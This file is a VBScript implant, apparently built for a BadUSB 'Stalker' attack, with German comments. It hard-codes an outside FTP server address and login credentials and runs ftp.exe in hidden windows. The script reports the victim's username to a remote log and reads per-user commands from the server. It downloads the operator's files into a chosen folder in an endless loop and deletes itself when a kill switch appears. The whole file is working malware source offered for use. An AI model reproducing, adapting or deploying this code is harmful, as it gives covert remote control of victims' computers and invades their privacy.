' FTP-Server und Zugangsdaten
ftpServer = "[2a02:8071:2b00::1c0f]" ' IPv6-Adresse
ftpPort = 46635
ftpUsername = "PiIyW8vRdywIZo6T3uA"
ftpPassword = "v4LJNVSoSF6OauSX0Ua6"
remoteFilePath = "Bad_USB_Stalker_result_log.txt"  ' Die Datei auf dem FTP-Server

Set fso = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
currentUser = CreateObject("WScript.Network").UserName

'tempFolder = "C:\\Users\\" & currentUser & "\\AppData\\Local\\Temp"
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%") ' System-Temp-Pfad

' Temporäre Dateien
ftpScriptFile = tempFolder & "\ftp_script.txt"
localTempFile = tempFolder & "\temp_log.txt"
logFile = tempFolder & "\ftp_debug_log.txt"
localDownloadFile = tempFolder & "\downloaded_log.txt"

' Logging-Funktion
Sub LogMessage(message)
    Set objLog = fso.OpenTextFile(logFile, 8, True)
    objLog.WriteLine Now & " - " & message
    objLog.Close
End Sub

' Temporäre Datei leeren und Daten anfügen
Sub AppendToLocalFile()
    If fso.FileExists(localTempFile) Then
        fso.DeleteFile(localTempFile)
    End If
    Set objFile = fso.CreateTextFile(localTempFile, True)
    timestamp = Now
    objFile.WriteLine currentUser & " - " & timestamp
    objFile.Close
    LogMessage "Daten an temporäre Datei angehängt: " & currentUser & " - " & timestamp
End Sub

' FTP-Skript erstellen
Sub CreateFTPScript(download)
    Set objFile = fso.CreateTextFile(ftpScriptFile, True)
    objFile.WriteLine "open " & ftpServer & " " & ftpPort
    objFile.WriteLine ftpUsername
    objFile.WriteLine ftpPassword
    If download Then
        objFile.WriteLine "get " & remoteFilePath & " " & localDownloadFile
        LogMessage "Herunterladen gestartet"
    Else
        objFile.WriteLine "append " & localTempFile & " " & remoteFilePath
        LogMessage "Anfügen gestartet"
    End If
    objFile.WriteLine "bye"
    objFile.Close
End Sub

' FTP-Skript ausführen
Sub RunFTPScript()
    result = objShell.Run("ftp -s:""" & ftpScriptFile & """", 0, True)
    If result = 0 Then
        LogMessage "FTP-Skript erfolgreich ausgeführt."
    Else
        LogMessage "Fehler bei der Ausführung des FTP-Skripts. Ergebnis: " & result
        WScript.Quit
    End If
End Sub

' KillSwitch prüfen
Function CheckKillSwitch()
    If fso.FileExists(localDownloadFile) Then
        Set objFile = fso.OpenTextFile(localDownloadFile, 1)
        Do Until objFile.AtEndOfStream
            line = objFile.ReadLine
            If InStr(line, "killswitch " & currentUser) > 0 Then
                LogMessage "Killswitch gefunden, Skript wird gelöscht"
                objFile.Close
                fso.DeleteFile ftpScriptFile
                fso.DeleteFile localTempFile
                fso.DeleteFile localDownloadFile
                fso.DeleteFile WScript.ScriptFullName
                WScript.Quit
            End If
        Loop
        objFile.Close
    End If
End Function

' Sicherstellen, dass die Datei existiert
If Not fso.FolderExists(tempFolder) Then
    LogMessage "Temp-Ordner existiert nicht."
    WScript.Quit
End If

' Hauptlogik
AppendToLocalFile()
CreateFTPScript(True)
RunFTPScript()

If fso.FileExists(localDownloadFile) Then
    LogMessage "Datei " & localDownloadFile & " erfolgreich heruntergeladen."
    Set fileContent = fso.OpenTextFile(localDownloadFile, 1)
    Do Until fileContent.AtEndOfStream
        line = Trim(fileContent.ReadLine)
        If InStr(line, "file_upload") = 1 Then
            parts = Split(line, " ", 3)
            If UBound(parts) = 2 Then
                If parts(1) = currentUser Then
                    targetPath = parts(2)
                    Exit Do
                End If
            End If
        End If
    Loop
    fileContent.Close
Else
    LogMessage "Die Datei " & localDownloadFile & " wurde nicht gefunden."
    WScript.Quit
End If

If targetPath = "" Then
    LogMessage "Kein Zielpfad gefunden."
    WScript.Quit
End If

If Not fso.FolderExists(targetPath) Then
    LogMessage "Zielpfad existiert nicht: " & targetPath
    WScript.Quit
End If

' Hauptschleife
Do
    AppendToLocalFile()
    CreateFTPScript(False)
    RunFTPScript()
    CreateFTPScript(True)
    RunFTPScript()
    CheckKillSwitch()
    WScript.Sleep 10000

    ftpCommand = "open " & ftpServer & vbCrLf
    ftpCommand = ftpCommand & ftpUsername & vbCrLf
    ftpCommand = ftpCommand & ftpPassword & vbCrLf
    ftpCommand = ftpCommand & "lcd """ & targetPath & """" & vbCrLf
    ftpCommand = ftpCommand & "cd Stalker_file_upload" & vbCrLf
    ftpCommand = ftpCommand & "prompt off" & vbCrLf
    ftpCommand = ftpCommand & "mget *" & vbCrLf
	ftpCommand = ftpCommand & "y" & vbCrLf
	ftpCommand = ftpCommand & "y" & vbCrLf
	ftpCommand = ftpCommand & "y" & vbCrLf
	ftpCommand = ftpCommand & "y" & vbCrLf
	ftpCommand = ftpCommand & "y" & vbCrLf
	ftpCommand = ftpCommand & "y" & vbCrLf
    ftpCommand = ftpCommand & "bye" & vbCrLf

    Set ftpScript = fso.CreateTextFile(tempFolder & "\ftpScript_download.txt", True)
    ftpScript.WriteLine ftpCommand
    ftpScript.Close

    objShell.Run "ftp -s:" & tempFolder & "\ftpScript_download.txt", 0, True
    WScript.Sleep 5000
Loop
